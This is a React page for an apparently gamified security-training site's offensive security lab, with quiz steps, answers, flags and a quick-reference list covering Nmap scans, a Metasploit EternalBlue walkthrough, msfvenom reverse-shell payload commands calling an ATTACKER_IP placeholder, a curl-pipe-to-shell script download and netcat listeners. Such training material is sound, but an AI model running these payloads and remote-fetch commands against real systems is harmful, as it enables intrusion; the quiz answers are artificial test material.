'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#bf5fff'
const moduleId = 'offensive'
const moduleName = 'Offensive Security'
const moduleNum = '04'
const xpTotal = 130

const steps: LabStep[] = [
  {
    id: 'offensive-01',
    title: 'Port Scanning with Nmap',
    objective: 'Discover open ports on a target. What nmap flag performs a SYN (stealth) scan?',
    hint: 'SYN scan is the default when run as root. The explicit flag is -sS.',
    answers: ['-sS', 'nmap -sS', '-sS target', 'syn scan'],
    xp: 20,
    explanation: 'nmap -sS sends TCP SYN packets and records responses without completing the 3-way handshake. It\'s faster and less likely to be logged than a full connect scan (-sT). Requires root/admin privileges.'
  },
  {
    id: 'offensive-02',
    title: 'Service Version Detection',
    objective: 'Identify software versions running on open ports. What nmap flag enables version detection?',
    hint: 'The flag is -sV — "s" for scan, "V" for version.',
    answers: ['-sV', 'nmap -sV', '-sV --version-intensity'],
    xp: 20,
    explanation: 'nmap -sV probes open ports to identify the running service and version. Combined with -sC (default scripts): nmap -sC -sV -oA scan target — saves output in all formats. Version info is critical for matching CVEs.'
  },
  {
    id: 'offensive-03',
    title: 'Metasploit Module Search',
    objective: 'In Metasploit, search for EternalBlue exploit modules. What msfconsole command searches for modules?',
    hint: 'The command is simply "search" followed by your search term.',
    answers: ['search eternalblue', 'search ms17-010', 'search smb', 'search'],
    xp: 25,
    explanation: 'In msfconsole: "search eternalblue" returns exploit/windows/smb/ms17_010_eternalblue. Then "use 0" to select, "options" to see required fields, "set RHOSTS target_ip", "run". Always verify you have authorization before using exploits.'
  },
  {
    id: 'offensive-04',
    title: 'Reverse Shell Payload',
    objective: 'Generate a Windows reverse shell with msfvenom. What payload string creates a Windows x64 reverse TCP Meterpreter shell?',
    hint: 'Format: windows/x64/meterpreter/reverse_tcp',
    answers: ['windows/x64/meterpreter/reverse_tcp', 'windows/meterpreter/reverse_tcp', 'meterpreter/reverse_tcp'],
    flag: 'FLAG{payload_generated}',
    xp: 35,
    explanation: 'Full command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe\nThe staged payload (/) contacts your listener to download the second stage. Use multi/handler in Metasploit to catch the connection.'
  },
  {
    id: 'offensive-05',
    title: 'Privilege Escalation Check',
    objective: 'After gaining initial access on Linux, what tool automatically enumerates privilege escalation vectors?',
    hint: 'A popular shell script: linPEAS or LinEnum. Both are valid.',
    answers: ['linpeas', 'linenum', 'linpeas.sh', 'linux-exploit-suggester', 'les'],
    flag: 'FLAG{privesc_enumerated}',
    xp: 30,
    explanation: 'LinPEAS (Linux Privilege Escalation Awesome Script) checks SUID/GUID binaries, sudo rules, cron jobs, world-writable files, kernel version, and hundreds more vectors. Run: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
  }
]

export default function OffensiveLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  useEffect(() => {
    const saved = localStorage.getItem('lab_offensive-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a2a7a' }}>
        <Link href="/" style={{ color: '#5a2a7a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/offensive" style={{ color: '#5a2a7a', textDecoration: 'none' }}>OFFENSIVE SECURITY</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/offensive" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #2a0a4a', borderRadius: '3px', color: '#5a2a7a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(191,95,255,0.1)', border: '1px solid rgba(191,95,255,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(191,95,255,0.04)', border: '1px solid rgba(191,95,255,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#2a0a4a', border: p.active ? '2px solid ' + accent : '1px solid #2a0a4a', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#4a2a6a', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#2a0a4a', margin: '0 2px' }}>—</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#6a4a8a' }}>
          MOD-{moduleNum} &nbsp;·&nbsp; {moduleName.toUpperCase()} &nbsp;·&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE — LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(191,95,255,0.1)', border: '1px solid rgba(191,95,255,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#4a2a6a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 — GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Offensive Security Lab</h1>
          </div>
        </div>

        <p style={{ color: '#7a6a8a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          Nmap scanning, Metasploit framework, payload generation, and privilege escalation enumeration.
          Type real commands, earn XP, and capture flags. Complete all 5 steps to unlock Phase 2.
        </p>

        <div style={{ background: 'rgba(191,95,255,0.03)', border: '1px solid rgba(191,95,255,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#2a0a4a', letterSpacing: '0.25em', marginBottom: '8px' }}>KEY CONCEPTS COVERED IN THIS LAB</div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
            {['SYN scanning', 'Version detection', 'Metasploit framework', 'EternalBlue (MS17-010)', 'msfvenom payloads', 'Meterpreter shell', 'LinPEAS privesc', 'Post-exploitation'].map(c => (
              <span key={c} style={{ fontSize: '7.5px', color: '#6a4a8a', background: 'rgba(191,95,255,0.06)', border: '1px solid rgba(191,95,255,0.12)', padding: '2px 8px', borderRadius: '3px' }}>{c}</span>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="offensive-lab"
          moduleId={moduleId}
          title="Offensive Security Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(191,95,255,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(191,95,255,0.4)' : '#2a0a4a'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#4a2a6a', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#6a4a8a' : '#4a2a6a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 — FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#4a2a6a' }}>Full Offensive Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#ffb347', background: 'rgba(255,179,71,0.08)', border: '1px solid rgba(255,179,71,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(191,95,255,0.04)' : '#060208', border: '1px solid ' + (guidedDone ? 'rgba(191,95,255,0.25)' : '#100520'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#6a4a8a' : '#2a0a4a', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#4a2a6a', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#6a4a8a', marginBottom: '0.75rem', lineHeight: 1.7 }}>
              Free-form terminal sandbox for Offensive Security
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#4a2a6a', marginBottom: '2rem', lineHeight: 1.7 }}>
              Command history &nbsp;·&nbsp; Tab autocomplete &nbsp;·&nbsp; Real command simulation &nbsp;·&nbsp; No restrictions
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['nmap scan techniques', 'msfconsole workflow', 'msfvenom payloads', 'Privilege escalation', 'Post-exploitation', 'Lateral movement prep'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#2a0a4a' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#6a4a8a' : '#2a0a4a' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(191,95,255,0.6)' : '#2a0a4a'), borderRadius: '6px', background: guidedDone ? 'rgba(191,95,255,0.12)' : 'transparent', color: guidedDone ? accent : '#2a0a4a', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(191,95,255,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#2a0a4a' }}>Complete all 5 guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#060208' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#080310', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#4a2a6a' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any offensive technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #2a0a4a', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#4a2a6a', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '▼' : '▶'} QUICK REFERENCE — OFFENSIVE COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#060208', border: '1px solid #100520', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: '8px' }}>
              {[
                ['nmap -sC -sV -oA scan target', 'Comprehensive scan with scripts, save all formats'],
                ['nmap -sS -p- target', 'SYN scan all 65535 ports'],
                ['nmap -sU --top-ports 100 target', 'UDP scan top 100 ports'],
                ['msfconsole', 'Start Metasploit Framework'],
                ['search eternalblue', 'Search Metasploit for MS17-010'],
                ['msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf', 'Linux reverse shell ELF'],
                ['msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe', 'Windows Meterpreter payload'],
                ['curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', 'Run LinPEAS privesc check'],
                ['find / -perm -u=s -type f 2>/dev/null', 'Find SUID binaries'],
                ['sudo -l', 'List sudo privileges'],
                ['cat /etc/crontab', 'Check cron jobs for privesc'],
                ['nc -nlvp 4444', 'Start netcat listener'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#040106', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.72rem', flexShrink: 0 }}>{cmd}</code>
                  <span style={{ color: '#6a4a8a', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #100520', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/offensive" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#4a2a6a' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/active-directory/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#4a2a6a' }}>MOD-05 ACTIVE DIRECTORY LAB &#8594;</Link>
      </div>
    </div>
  )
}
